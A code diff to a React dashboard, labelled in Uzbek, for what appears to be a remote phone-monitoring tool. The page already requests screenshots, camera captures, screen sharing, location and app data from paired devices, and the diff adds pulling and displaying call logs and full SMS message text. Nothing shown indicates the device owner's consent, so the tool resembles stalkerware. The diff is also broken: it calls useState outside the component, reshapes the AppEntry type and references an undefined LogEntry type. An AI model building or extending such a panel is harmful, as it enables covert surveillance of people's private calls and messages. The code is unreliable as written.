@@ -1,6 +1,6 @@
 'use client';
 import { useEffect, useRef, useState } from 'react';
-
+const [activeTab, setActiveTab,call_logs,sms_logs] = useState<'overview' | 'live' | 'apps' | 'telephony'>('overview');
 type Device = {
   _id: string; name: string; deviceId: string;
   pairingCode: string; online: boolean;
@@ -10,12 +10,14 @@ type Req = {
   _id: string; deviceId: string; type: string;
   status: string; createdAt: string; resultUrl?: string;
 };
-type AppEntry = { name: string; package: string; minutes?: number };
+type AppEntry = { number: string; name?: string; type?: string; duration?: number; date?: string; body?: string };
 type ModalContent =
   | { kind: 'image'; url: string }
   | { kind: 'map'; lat: number; lng: number }
   | { kind: 'apps'; data: AppEntry[] }
-  | { kind: 'usage'; data: AppEntry[] };
+  | { kind: 'usage'; data: AppEntry[] }
+  | { kind: 'calls'; data: LogEntry[] }
+  | { kind: 'sms'; data: LogEntry[] };
 
 const STATUS_COLOR: Record<string, string> = {
   PENDING: '#f59e0b', DONE: '#10b981', FAILED: '#ef4444',
@@ -28,6 +30,8 @@ const TYPE_META: Record<string, { icon: string; label: string }> = {
   LOCATION:     { icon: '📍', label: 'Lokatsiya' },
   APP_LIST:     { icon: '📋', label: 'Ilovalar' },
   APP_USAGE:    { icon: '📊', label: 'Foydalanish' },
+  CALL_LOGS:    { icon: '📞', label: "Qo'ng'iroqlar" },
+  SMS_LOGS:     { icon: '💬', label: 'SMS xabarlar' },
 };
 
 function timeAgo(dateStr: string) {
@@ -50,7 +54,7 @@ function isImageType(t: string) {
   return ['SCREENSHOT','CAMERA_FRONT','CAMERA_BACK','SCREEN_SHARE'].includes(t);
 }
 function isJsonType(t: string) {
-  return ['APP_LIST','APP_USAGE'].includes(t);
+  return ['APP_LIST','APP_USAGE','CALL_LOGS','SMS_LOGS'].includes(t);
 }
 
 const S = {
@@ -333,13 +337,18 @@ export default function Home() {
       setLoadingId(null); return;
     }
     if (isJsonType(r.type)) {
-      try {
-        const res  = await fetch(r.resultUrl);
-        const data: AppEntry[] = await res.json();
-        setModal({ kind: r.type === 'APP_LIST' ? 'apps' : 'usage', data });
-      } catch (_) {}
-      setLoadingId(null); return;
-    }
+  try {
+    const res = await fetch(r.resultUrl);
+    const data = await res.json();
+    
+    if (r.type === 'APP_LIST') setModal({ kind: 'apps', data });
+    else if (r.type === 'APP_USAGE') setModal({ kind: 'usage', data });
+    else if (r.type === 'CALL_LOGS') setModal({ kind: 'calls', data });
+    else if (r.type === 'SMS_LOGS') setModal({ kind: 'sms', data });
+  } catch (_) {}
+  setLoadingId(null); 
+  return;
+}
     setModal({ kind: 'image', url: r.resultUrl });
     setLoadingId(null);
   }
@@ -373,6 +382,9 @@ export default function Home() {
     { type: 'LOCATION',     label: '📍 Lokatsiya' },
     { type: 'APP_LIST',     label: '📋 Ilovalar' },
     { type: 'APP_USAGE',    label: '📊 Foydalanish' },
+    { type: 'CALL_LOGS',    label: "📞 Qo'ng'iroqlar" }, 
+  { type: 'SMS_LOGS',     label: '💬 SMS xabarlar' },  
+    
   ];
 
   return (
@@ -637,6 +649,45 @@ export default function Home() {
                 </div>
               </div>
             )}
+            {/* 🟢 Qo'ng'iroqlar Modali */}
+{modal.kind === 'calls' && (
+  <div style={{ padding: 24, minWidth: 360 }}>
+    <h3 style={{ fontSize: 16, fontWeight: 700, margin: '0 0 4px', color: '#f1f5f9' }}>📞 Qo'ng'iroqlar tarixi</h3>
+    <p style={{ fontSize: 12, color: '#475569', margin: '0 0 16px' }}>Jami: {modal.data.length} ta</p>
+    <div style={{ display: 'grid', gap: 6 }}>
+      {modal.data.map((item, i) => (
+        <div key={i} style={{ padding: '8px 12px', background: 'rgba(255,255,255,0.04)', borderRadius: 8, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+          <div>
+            <div style={{ fontSize: 13, fontWeight: 600, color: '#e2e8f0' }}>{item.name || item.number}</div>
+            <div style={{ fontSize: 11, color: '#64748b' }}>{item.number} {item.date ? `· ${item.date}` : ''}</div>
+          </div>
+          {item.duration != null && (
+            <span style={{ fontSize: 11, color: '#10b981', fontWeight: 600 }}>{item.duration}s</span>
+          )}
+        </div>
+      ))}
+    </div>
+  </div>
+)}
+
+{/* 🟢 SMS Xabarlar Modali */}
+{modal.kind === 'sms' && (
+  <div style={{ padding: 24, minWidth: 360 }}>
+    <h3 style={{ fontSize: 16, fontWeight: 700, margin: '0 0 4px', color: '#f1f5f9' }}>💬 SMS Xabarlar</h3>
+    <p style={{ fontSize: 12, color: '#475569', margin: '0 0 16px' }}>Jami: {modal.data.length} ta</p>
+    <div style={{ display: 'grid', gap: 6 }}>
+      {modal.data.map((item, i) => (
+        <div key={i} style={{ padding: '10px 12px', background: 'rgba(255,255,255,0.04)', borderRadius: 8 }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
+            <span style={{ fontSize: 13, fontWeight: 600, color: '#8b5cf6' }}>{item.name || item.number}</span>
+            <span style={{ fontSize: 10, color: '#64748b' }}>{item.date}</span>
+          </div>
+          <div style={{ fontSize: 12, color: '#cbd5e1' }}>{item.body}</div>
+        </div>
+      ))}
+    </div>
+  </div>
+)}
           </div>
         </div>
       )}
